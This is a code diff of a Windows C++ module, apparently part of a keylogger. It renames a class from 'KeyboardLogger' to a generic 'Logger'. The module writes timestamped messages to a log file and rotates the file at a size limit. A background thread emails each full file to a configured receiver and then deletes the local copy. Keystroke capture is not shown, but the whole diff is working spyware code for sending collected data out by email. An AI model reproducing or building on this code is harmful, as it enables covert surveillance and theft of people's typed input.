@@ -1,13 +1,14 @@
-#include "KeyboardLogger.h"
+#include "Logger.h"
 
-string KeyboardLogger::emailReceiver;
+string Logger::emailReceiver;
 
-KeyboardLogger::KeyboardLogger(long long maxLength, string emailReceiver)
+Logger::Logger(long long maxLength, string emailReceiver, wstring fileName)
 {
+	this->fileName = fileName;
 	this->maxLength = maxLength;
 	this->currentLength = 0;
 	this->emailReceiver = emailReceiver;
-	hFile = CreateFile(FILE_NAME,
+	hFile = CreateFile(fileName.c_str(),
 		GENERIC_WRITE,
 		0,
 		NULL,
@@ -16,7 +17,7 @@ KeyboardLogger::KeyboardLogger(long long maxLength, string emailReceiver)
 		NULL);
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
-		hFile = CreateFile(FILE_NAME,
+		hFile = CreateFile(fileName.c_str(),
 			GENERIC_WRITE,
 			0,
 			NULL,
@@ -28,16 +29,47 @@ KeyboardLogger::KeyboardLogger(long long maxLength, string emailReceiver)
 	{
 		SetFilePointer(hFile, 0, NULL, FILE_END);
 	}
-	
 }
 
 
-KeyboardLogger::~KeyboardLogger()
+Logger::~Logger()
 {
 	CloseHandle(hFile);
 }
 
-void KeyboardLogger::addMessage(string mes)
+string Logger::getCurrentTime()
+{
+	auto end = std::chrono::system_clock::now();
+	time_t currentTime = std::chrono::system_clock::to_time_t(end);
+	string time = ctime(&currentTime);
+	time.resize(time.size() - 1);
+	return time;
+}
+
+void Logger::sendFile(wstring fileName)
+{
+	Email email(this->emailReceiver);
+	email.send(fileName);
+	return;
+}
+
+void Logger::clearFile(wstring fileName)
+{
+	ofstream file(fileName, ios_base::out | ios_base::trunc);
+	file.close();
+	return;
+}
+
+void Logger::sendFileNewThread(LPVOID arg)
+{
+	wstring *fileName = (wstring *)arg;
+	Email email(emailReceiver);
+	email.send(*fileName);
+	DeleteFile(fileName->c_str());
+	delete fileName;
+}
+
+void Logger::addMessage(string mes)
 {
 	string stringToWrite;
 	string currentTime = this->getCurrentTime();
@@ -52,8 +84,8 @@ void KeyboardLogger::addMessage(string mes)
 		wstring newName = this->renameCurrentFile();
 		wstring *name = new wstring(newName);
 		DWORD id;
-		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&this->sendFileNewThread, (LPVOID) name, NULL, &id);
-		hFile = CreateFile(FILE_NAME,
+		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&this->sendFileNewThread, (LPVOID)name, NULL, &id);
+		hFile = CreateFile(fileName.c_str(),
 			GENERIC_WRITE,
 			0,
 			NULL,
@@ -64,7 +96,7 @@ void KeyboardLogger::addMessage(string mes)
 	}
 	DWORD written;
 	WriteFile(
-		hFile,          
+		hFile,
 		stringToWrite.c_str(),
 		stringToWrite.size(),
 		&written,
@@ -72,33 +104,11 @@ void KeyboardLogger::addMessage(string mes)
 	return;
 }
 
-void KeyboardLogger::clearFile(wstring fileName)
-{
-	ofstream file(fileName, ios_base::out | ios_base::trunc);
-	file.close();
-	return;
-}
 
-void KeyboardLogger::sendFile(wstring fileName)
-{
-	Email email(this->emailReceiver);
-	email.send(fileName);
-	return;
-}
-
-string KeyboardLogger::getCurrentTime()
-{
-	auto end = std::chrono::system_clock::now();
-	time_t currentTime = std::chrono::system_clock::to_time_t(end);
-	string time = ctime(&currentTime);
-	time.resize(time.size() - 1);
-	return time;
-}
-
-wstring KeyboardLogger::renameCurrentFile()
+wstring Logger::renameCurrentFile()
 {
 	int num = 0;
-	wstring name(FILE_NAME);
+	wstring name(fileName.c_str());
 	wstring newName;
 	ifstream infile;
 	do
@@ -110,15 +120,6 @@ wstring KeyboardLogger::renameCurrentFile()
 		infile.open(newName);
 		num++;
 	} while (infile.good());
-	MoveFile(FILE_NAME, newName.c_str());
+	MoveFile(fileName.c_str() , newName.c_str());
 	return newName;
-}
-
-void KeyboardLogger::sendFileNewThread(LPVOID arg)
-{
-	wstring *fileName = (wstring *)arg;
-	Email email(emailReceiver);
-	email.send(*fileName);
-	DeleteFile(fileName->c_str());
-	delete fileName;
 }
